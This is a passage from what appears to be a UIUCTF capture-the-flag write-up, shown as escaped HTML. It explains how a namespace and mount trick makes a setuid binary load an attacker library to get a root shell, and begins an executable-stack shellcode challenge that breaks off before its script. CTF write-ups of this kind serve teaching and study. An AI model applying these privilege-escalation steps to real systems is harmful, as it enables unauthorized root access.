+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>From: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon, 19 Jun 2023 23:04:25 -0700
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Subject: [PATCH] fs/namespace: Check userns instead of mntns in mnt_may_suid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>If we are in the same userns, I don&amp;#39;t see why we need to check
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>if we are in the same mntns too, right?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Signed-off-by: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">&lt;/span> fs/namespace.c | 3 ++-
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1 file changed, 2 insertions(+), 1 deletion(-)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/fs/namespace.c b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index eb196f016e3f..25757327a82a 100644
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -4609,7 +4609,8 @@ bool mnt_may_suid(struct vfsmount *mnt)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> * suid/sgid bits, file caps, or security labels that originate
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * in other namespaces.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> */
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- return !(mnt-&amp;gt;mnt_flags &amp;amp; MNT_NOSUID) &amp;amp;&amp;amp; check_mnt(real_mount(mnt)) &amp;amp;&amp;amp;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ return !(mnt-&amp;gt;mnt_flags &amp;amp; MNT_NOSUID) &amp;amp;&amp;amp;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ current_in_userns(real_mount(mnt)-&amp;gt;mnt_ns-&amp;gt;user_ns) &amp;amp;&amp;amp;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span> current_in_userns(mnt-&amp;gt;mnt_sb-&amp;gt;s_user_ns);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>2.41.0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This patch allows &lt;code>setuid&lt;/code> binary behavior if the user namespace that is holding the current mount is the same as the current user namespace of the task.&lt;/p>
+&lt;p>The goal of this challenge is still the same as the previous one: try to make the &lt;code>setuid&lt;/code> binary loads our custom library. How can we abuse the patches to achieve that?&lt;/p>
+&lt;p>By calling &lt;code>SYS_open_tree&lt;/code> with &lt;code>OPEN_TREE_CLONE&lt;/code>, the tree will be in a detached state. We can attach the tree using &lt;code>SYS_move_mount&lt;/code>, but it requires &lt;code>CAP_SYS_ADMIN&lt;/code> in order to modify the mount table. Interestingly, in detached state, the root of the tree will be at &lt;code>/&lt;/code>. If we call &lt;code>SYS_execveat&lt;/code> using the detached tree as the &lt;code>dirfd&lt;/code>, &lt;code>/proc/self/exe&lt;/code> symlink will not be the full path to the binary. Example in pseudocode:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">SYS_open_tree&lt;/span>(AT_FDCWD, &lt;span style="color:#e6db74">&amp;#34;/usr/lib/zapps&amp;#34;&lt;/span>, OPEN_TREE_CLONE &lt;span style="color:#f92672">|&lt;/span> AT_RECURSIVE)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">SYS_execveat&lt;/span>(fd, &lt;span style="color:#e6db74">&amp;#34;build/exe&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// /proc/self/exe now links to /build/exe
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is convenient because the loader code of &lt;code>zapps&lt;/code> finds &lt;code>ld.so&lt;/code> using &lt;code>/proc/self/exe&lt;/code> link (file &lt;code>zapps-crt0.c&lt;/code> in the handout package):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> ld_rel[] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/ld-linux-x86-64.so.2&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> exe_path_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_zapps_sys_readlink&lt;/span>((&lt;span style="color:#66d9ef">char&lt;/span> []){&lt;span style="color:#e6db74">&amp;#34;/proc/self/exe&amp;#34;&lt;/span>}, ld, PATH_MAX);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (exe_path_len &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> exe_path_len &lt;span style="color:#f92672">&amp;gt;=&lt;/span> PATH_MAX)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_zapps_die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Zapps: Fatal: failed to readlink /proc/self/exe&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ld[exe_path_len] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">_zapps_strrchr&lt;/span>(ld, &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_zapps_strncat&lt;/span>(ld, ld_rel, &lt;span style="color:#66d9ef">sizeof&lt;/span>(ld) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ld_fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_zapps_sys_open&lt;/span>(ld, O_RDONLY &lt;span style="color:#f92672">|&lt;/span> O_CLOEXEC);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (ld_fd &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_zapps_die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Zapps: Fatal: failed to open ld.so&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But we cannot freely create any directory as &lt;code>user&lt;/code>. Fortunately, patch #1 allows us to do cross loopback mount between mount namespaces. We will do the following:&lt;/p>
+&lt;ul>
+&lt;li>Fork the process&lt;/li>
+&lt;li>In the child process:
+&lt;ul>
+&lt;li>Call &lt;code>unshare(CLONE_NEWUSER | CLONE_NEWNS)&lt;/code> to enter a new mount namespace and have &lt;code>CAP_SYS_ADMIN&lt;/code> so we can modify the mount table&lt;/li>
+&lt;li>Bind mount &lt;code>/usr/lib/zapps&lt;/code> to &lt;code>/home/user/home/user&lt;/code>&lt;/li>
+&lt;li>Call &lt;code>SYS_open_tree(AT_FDCWD, &amp;quot;/home/user&amp;quot;, 0)&lt;/code> to open a tree &lt;code>fd&lt;/code>&lt;/li>
+&lt;li>Start an infinite loop to keep the namespaces&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>In the original process:
+&lt;ul>
+&lt;li>Sleep to wait for the child to complete all mount operations&lt;/li>
+&lt;li>Call &lt;code>fd = SYS_open_tree(AT_FDCWD, &amp;quot;/proc/&amp;lt;child_pid&amp;gt;/fd/3&amp;quot;, OPEN_TREE_CLONE | AT_RECURSIVE)&lt;/code> to clone a detached tree of &lt;code>/home/user&lt;/code> in the child mount namespace (patch #2 allows &lt;code>user&lt;/code> to do this)&lt;/li>
+&lt;li>Call &lt;code>SYS_execveat(fd, &amp;quot;home/user/build/exe&amp;quot;)&lt;/code> to launch the binary (patch #3 allows the &lt;code>setuid&lt;/code> behavior even though the tree is in another mount namespace)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>When the binary is executed, &lt;code>/proc/self/exe&lt;/code> links to &lt;code>/home/user/build/exe&lt;/code>. Copy &lt;code>*so*&lt;/code> files from &lt;code>/usr/lib/zapps/build/&lt;/code> to &lt;code>/home/user/build/&lt;/code>, patch &lt;code>ld&lt;/code> and create a custom &lt;code>lib.so&lt;/code> like previous challenge and we will get a root shell.&lt;/p>
+&lt;p>Flag: &lt;code>uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}&lt;/code>&lt;/p>
+&lt;h2 id="virophage">Virophage&lt;/h2>
+&lt;blockquote>
+&lt;p>This challenge is inspired by TSJ CTF 2022&amp;rsquo;s &lt;a class="link" href="https://github.com/XxTSJxX/TSJ-CTF-2022/tree/main/Pwn/Virus" target="_blank" rel="noopener"
+>&amp;ldquo;virus&amp;rdquo; challenge&lt;/a>.&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>I thought a virus could be even tinier, but I there&amp;rsquo;s a catch: are viruses alive or dead? What separates living organisms from lifeless objects? Can viruses &lt;a class="link" href="https://en.wikipedia.org/wiki/Virophage" target="_blank" rel="noopener"
+>infect other viruses&lt;/a>?&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>&lt;strong>Note: This challenge has not been solved by the author.&lt;/strong> &lt;a class="link" href="https://xkcd.com/356/" target="_blank" rel="noopener"
+>Have fun!&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>The challenge&amp;rsquo;s executable (the spawner) is a &lt;code>setuid&lt;/code> binary, owned by &lt;code>root&lt;/code> at &lt;code>/home/user/virophage&lt;/code>.
+It will do the following:&lt;/p>
+&lt;ul>
+&lt;li>Isolate &lt;code>/tmp&lt;/code> by changing into another mount namespace&lt;/li>
+&lt;li>Ask the user to provide a number in hex, called &lt;code>phage&lt;/code> in the source code&lt;/li>
+&lt;li>Create a 32-bit ELF file at &lt;code>/tmp/virus&lt;/code> with this header:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Elf32_Ehdr ehdr;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Elf32_Phdr phdr;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} data &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .ehdr &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_ident &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ELFCLASS32, ELFDATA2LSB, EV_CURRENT,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ELFOSABI_SYSV
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_type &lt;span style="color:#f92672">=&lt;/span> ET_EXEC,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_machine &lt;span style="color:#f92672">=&lt;/span> EM_386,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_version &lt;span style="color:#f92672">=&lt;/span> EV_CURRENT,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_entry &lt;span style="color:#f92672">=&lt;/span> phage,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_ehsize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(Elf32_Ehdr),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_phentsize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(Elf32_Phdr),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .e_phnum &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .phdr &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .p_type &lt;span style="color:#f92672">=&lt;/span> PT_NULL,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>Change effective user id to &lt;code>root&lt;/code>&lt;/li>
+&lt;li>Disable ASLR for child process (or execve&amp;rsquo;d by this process) by calling &lt;code>SYS_personality(ADDR_NO_RANDOMIZE)&lt;/code>&lt;/li>
+&lt;li>Execute &lt;code>/tmp/virus&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>From the ELF header, we can see that the number we entered will be used as the entry address of the virus.
+How can we execute code? Using the provided test environment, let&amp;rsquo;s attach &lt;code>gdb&lt;/code> to it:&lt;/p>
+&lt;pre tabindex="0">&lt;code>(gdb) r
+Starting program: /home/user/virophage
+Please enter a number in hex: 0x0
+You entered: 0x00000000
+execve...
+process 70 is executing new program: /tmp/virus
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+&lt;/code>&lt;/pre>&lt;p>As expected, the program crashes at where we set the entry point. Examine the mappings:&lt;/p>
+&lt;pre tabindex="0">&lt;code>(gdb) info proc mappings
+process 70
+Mapped address spaces:
+Start Addr End Addr Size Offset Perms objfile
+0xf7ff8000 0xf7ffc000 0x4000 0x0 r--p [vvar]
+0xf7ffc000 0xf7ffe000 0x2000 0x0 r-xp [vdso]
+0xfffdd000 0xffffe000 0x21000 0x0 rwxp [stack]
+(gdb)
+&lt;/code>&lt;/pre>&lt;p>Notice that permission of the stack is &lt;code>rwxp&lt;/code>, which means we can execute code on stack. Why does this happen?
+Reading through &lt;a class="link" href="https://man7.org/linux/man-pages/man5/elf.5.html" target="_blank" rel="noopener"
+>the &lt;code>man&lt;/code> page of ELF&lt;/a>,
+we know that &lt;code>PT_GNU_STACK&lt;/code> program header is used to control the state of the stack (R, W, X)
+base on the &lt;code>p_flag&lt;/code> field in &lt;code>Elf32_Phdr&lt;/code> structure. But in the generated header of the virus, that header is not available.
+So what is the default permission of the stack? Why isn&amp;rsquo;t it non-executable by default? Let&amp;rsquo;s look at the kernel:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * An executable for which elf_read_implies_exec() returns TRUE will
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * have the READ_IMPLIES_EXEC personality flag set automatically.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * The decision process for determining the results are:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * CPU: | lacks NX* | has NX, ia32 | has NX, x86_64 |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * ELF: | | | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * ---------------------|------------|------------------|----------------|
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * missing PT_GNU_STACK | exec-all | exec-all | exec-none |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * PT_GNU_STACK == RWX | exec-stack | exec-stack | exec-stack |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * PT_GNU_STACK == RW | exec-none | exec-none | exec-none |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * exec-all : all PROT_READ user mappings are executable, except when
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * backed by files on a noexec-filesystem.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * exec-none : only PROT_EXEC user mappings are executable.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * exec-stack: only the stack and PROT_EXEC user mappings are executable.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * *this column has no architectural effect: NX markings are ignored by
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * hardware, but may have behavioral effects when &amp;#34;wants X&amp;#34; collides with
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;#34;cannot be X&amp;#34; constraints in memory permission flags, as in
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * https://lkml.kernel.org/r/20190418055759.GA3155@mellanox.com
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define elf_read_implies_exec(ex, executable_stack) \
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> (mmap_is_ia32() &amp;amp;&amp;amp; executable_stack == EXSTACK_DEFAULT)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The virus is a 32-bit ELF, so the decision will be &lt;code>exec-all&lt;/code>. Along with the fact that ASLR is disabled for the virus,
+we can point the entry address to the stack and execute code. But how do we put code on the stack? Looking at the entry point of the spawner:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">virophage_start_main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>stack)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>argv, &lt;span style="color:#f92672">*&lt;/span>envp;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> argc;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> argc &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uintptr_t&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>stack&lt;span style="color:#f92672">++&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> argv &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)stack;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> argc; i&lt;span style="color:#f92672">++&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stack&lt;span style="color:#f92672">++&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stack&lt;span style="color:#f92672">++&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> envp &lt;span style="color:#f92672">=&lt;/span> stack;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_vp_sys_exit&lt;/span>(&lt;span style="color:#a6e22e">virophage_main&lt;/span>(argc, argv, envp));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">__asm__&lt;/span> (
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;.globl _start&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;.section .text,&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">ax&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">,@progbits&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;.type _start, @function&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;_start:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; mov %rsp, %rdi&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; call virophage_start_main&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; hlt&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>All arguments and environment variables that we pass to the spawner will be available on the stack.
+Later, the virus is executed using the following parameters:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">_vp_sys_execve&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/tmp/virus&amp;#34;&lt;/span>, argv, envp);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That means the virus will inherit all arguments and environment variables of the spawner. These will also be on the virus&amp;rsquo;s stack.
+We can pass a non-null shellcode as an argument for the spawner then point the entry address of the virus to it.
+Padding some &lt;code>nop&lt;/code> instructions before the actual shellcode will make it easier to identify on the stack.
+I used the following script to generate a base64 encoded shellcode:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;i386&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>os &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
